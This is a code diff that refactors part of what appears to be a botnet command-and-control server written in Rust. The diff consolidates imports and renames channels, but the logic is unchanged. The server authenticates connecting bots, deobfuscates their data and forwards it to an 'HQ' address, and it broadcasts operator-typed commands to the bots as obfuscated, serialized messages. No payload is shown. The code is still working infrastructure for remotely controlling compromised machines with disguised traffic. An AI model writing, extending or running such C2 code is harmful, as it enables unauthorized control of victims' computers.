@@ -7,28 +7,38 @@ use tokio::{
         broadcast::Receiver,
         broadcast::Sender
     },
-    net::tcp::OwnedWriteHalf
+    net::tcp::OwnedWriteHalf,
+    sync::broadcast::error::TryRecvError
 };
-use std::{io, slice, net::SocketAddr, process::Command, ptr::slice_from_raw_parts, str::{EscapeDebug, from_utf8}, thread, net, future};
-use std::error::Error;
-use std::sync::mpsc;
+use std::{
+    io,
+    slice,
+    net::SocketAddr,
+    process::Command,
+    ptr::slice_from_raw_parts,
+    str::{EscapeDebug, from_utf8},
+    thread,
+    net,
+    future,
+    error::Error,
+    sync::mpsc,
+    future::Future,
+    thread::JoinHandle
+};
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 use base32;
-use std::future::Future;
-use std::thread::JoinHandle;
-use tokio::sync::broadcast::error::TryRecvError;
 
-use crate::communication::bot::{Bot, Device_stream};
-use crate::communication::rsa_encryption;
-use crate::morse;
-use crate::communication::lib;
-use crate::communication::data_processing as dp;
-use crate::communication::data_processing::{obfuscate_data, serialize_data};
+use crate::{
+    morse,
+    communication::bot::{Bot, Device_stream},
+    communication::lib,
+    encryption as enc,
+    message as msg,
+};
 use super::bot;
 
 const HQ: &str = "127.0.0.1:6969";
-
 const LOCAL: &str = "127.0.0.1:6000";
 const MSG_SIZE: usize = 4096;
 const USERNAME_LENGTH: usize = 10;
@@ -56,7 +66,7 @@ async fn handle_message_received(DS: &mut bot::Device_stream, socket: &tokio::ne
                 println!("Error: {}", e);
             }
         };
-        println!("buffer readyo : {:?}", buffer);
+        println!("buffer read : {:?}", buffer);
         return buffer.to_vec();
     };
 }
@@ -71,9 +81,8 @@ async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr)
     );
     let data = handle_message_received(&mut DS, socket).await;
     if DS.connected {
-        let encryption_key = dp::deobfuscate_data(data, false, &DS.encryption_key);
-        println!("data : {:?}", encryption_key);
-        DS.B = dp::deserialize_message(encryption_key);
+        let encryption_key = msg::data_processing::deobfuscate_data(data, false, &DS.encryption_key);
+        DS.B = msg::data_processing::deserialize_message(encryption_key);
         DS.encryption_key = DS.B.com.data.clone();
     }
     return DS;
@@ -81,8 +90,8 @@ async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr)
 
 async fn handle_message_from_client(
     mut DS: bot::Device_stream,
-    mut c2_tx: Sender<bot::Device_stream>,
-    mut cmd_rx: Receiver<bot::Device_stream>,
+    mut bot_tx: Sender<bot::Device_stream>,
+    mut c2_rx: Receiver<bot::Device_stream>,
     mut socket: tokio::net::TcpStream,
 ) -> io::Result<()> {
 
@@ -96,9 +105,9 @@ async fn handle_message_from_client(
                 DS.connected = false;
             },
             Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
-                let marshaled_data = dp::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
-                DS.B = dp::deserialize_message(marshaled_data);
-                c2_tx.send(DS.clone()).unwrap();
+                let marshaled_data = msg::data_processing::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
+                DS.B = msg::data_processing::deserialize_message(marshaled_data);
+                bot_tx.send(DS.clone()).unwrap();
                 buffer
                     .iter_mut()
                     .for_each(|x| *x = 0); // reset buffer
@@ -112,11 +121,10 @@ async fn handle_message_from_client(
                 println!("Error: {}", err);
             },
         };
-        match cmd_rx.try_recv() {
+        match c2_rx.try_recv() {
             Ok(DS) => {
-                println!("Received command from HQ");
-                let serialized_data = serialize_data(&DS.B);
-                let obfuscated_data = obfuscate_data(serialized_data, &DS.encryption_key);
+                println!("Sending commands to bots");
+                let obfuscated_data = msg::data_processing::obfuscate_data(msg::data_processing::serialize_data(&DS.B), &DS.encryption_key);
                 socket.write(obfuscated_data.as_slice()).await?;
             },
             _ => {}
@@ -126,7 +134,7 @@ async fn handle_message_from_client(
 }
 
 async fn client_input (
-    tx: Sender<Device_stream>,
+    c2_tx: Sender<Device_stream>,
     mut DS: &mut bot::Device_stream,
 ) {
     loop {
@@ -138,7 +146,7 @@ async fn client_input (
         buff.pop();
         DS.B.com.command = buff.as_bytes().to_vec();
 
-        tx.send(DS.clone()).unwrap(); // edode : Data has to be sent to the bots
+        c2_tx.send(DS.clone()).unwrap(); // edode : Data has to be sent to the bots
     }
 }
 
@@ -181,25 +189,24 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
             drop(DS);
             continue;
         }
-        let mut c_cmd = DS.clone();
+        let mut DS_clone = DS.clone();
 
-        let mut bot_rcv = chn_bot_tx.subscribe();
+        let mut bot_rx = chn_bot_tx.subscribe();
         let bot_tx = chn_bot_tx.clone();
 
-        let mut c2_rcv = chn_c2_tx.subscribe();
+        let mut c2_rx = chn_c2_tx.subscribe();
         let c2_tx = chn_c2_tx.clone();
-        let tr = chn_c2_tx.clone();
 
         tokio::spawn(async move {
-            handle_message_from_client(DS, bot_tx, c2_rcv, socket).await;
+            handle_message_from_client(DS, bot_tx, c2_rx, socket).await;
         });
 
         tokio::spawn(async move {
-            receive_bot_data(bot_rcv).await;
+            receive_bot_data(bot_rx).await;
         });
 
         tokio::spawn(async move {
-            client_input(c2_tx, &mut c_cmd).await;
+            client_input(c2_tx, &mut DS_clone).await;
         });
     }
     Ok(())
